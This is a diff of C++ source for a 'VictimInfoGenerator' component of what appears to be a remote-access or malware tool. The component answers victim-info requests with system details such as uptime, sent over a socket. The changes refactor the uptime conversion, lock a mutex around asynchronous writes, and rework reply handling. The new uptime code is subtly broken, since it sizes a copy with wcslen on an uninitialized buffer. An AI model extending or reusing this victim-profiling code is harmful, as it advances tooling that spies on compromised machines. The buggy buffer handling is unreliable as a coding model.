@@ -117,13 +117,15 @@ namespace http
 		wchar_t* VictimInfoGenerator::GetUpTime()
 		{
 			auto uptime = std::chrono::milliseconds(GetTickCount64());
-			const long millis = uptime.count();
-			wchar_t* buff = new wchar_t[100];
-			_ltow(millis, buff, 10);
+			const long long millis = uptime.count();
+			std::wstring millis_wide = std::to_wstring(millis);
+			wchar_t* result = new wchar_t[100];
+			wcscpy_s(result, wcslen(result), millis_wide.c_str());
 
-			wchar_t *result = new wchar_t[wcslen(buff) + 1];
-			wcscpy_s(result, wcslen(buff) + 1, buff);
-			delete[] buff;
+			//_ltow(millis, buff, 10);
+			//wchar_t *result = new wchar_t[wcslen(buff) + 1];
+			//wcscpy_s(result, wcslen(buff) + 1, buff);
+			//delete[] buff;
 			return result;
 		}
 
@@ -333,6 +335,7 @@ namespace http
 				rep->headers[2].value = std::to_string(rep->content.size());
 			}
 
+			async_write_mutex.lock();
 			async_write(socket_,
 				rep->to_buffers(),
 				boost::bind(&VictimInfoGenerator::handle_write,
@@ -345,16 +348,18 @@ namespace http
 
 		void VictimInfoGenerator::handle_write(std::shared_ptr<reply> rep, const boost::system::error_code& e, std::size_t bytes)
 		{
+			async_write_mutex.unlock();
 			rep.reset();
 		}
 
-		bool VictimInfoGenerator::execute(std::shared_ptr<request> req, std::shared_ptr<reply> rep)
+		bool VictimInfoGenerator::execute(std::shared_ptr<request> req)
 		{
 			if (req->action_type.compare(wxhtpconstants::ACTION_TYPE::VICTIM_INFO))
 			{
 				return false;
 			}
 
+			std::shared_ptr<reply> rep(new reply());
 			std::shared_ptr<std::vector<char>> buffer_ptr = std::make_shared<std::vector<char>>();
 			operations_queue_ptr->add(
 				boost::bind(&VictimInfoGenerator::get_victim_info, this, buffer_ptr),
